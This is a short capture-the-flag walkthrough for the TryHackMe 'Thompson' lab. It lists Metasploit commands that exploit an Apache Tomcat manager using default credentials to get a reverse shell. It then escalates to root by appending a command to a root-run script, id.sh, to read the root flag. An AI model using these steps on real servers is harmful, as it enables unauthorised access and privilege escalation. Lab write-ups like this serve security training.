# Thompson
https://tryhackme.com/room/bsidesgtthompson

8080/tcp open  http    Apache Tomcat 8.5.5

exploit tomcat manager using metasploit 
		
	use exploit/multi/http/tomcat_mgr_upload
	show options
	set RHOST <target ip>
	set RPORT 8080
	set LHOST <your ovpn ip>
	set httpUsername tomcat
	set httpPassword s3cret
	exploit

user shell!

In home dir jack has a file called id.sh, whichs we have to save cmd into this id.sh then its run that cmd as root.
	
	cd /home/jack
	echo "cat /root/root.txt > test.txt" >> id.sh
	cat test.txt

Root flag.....

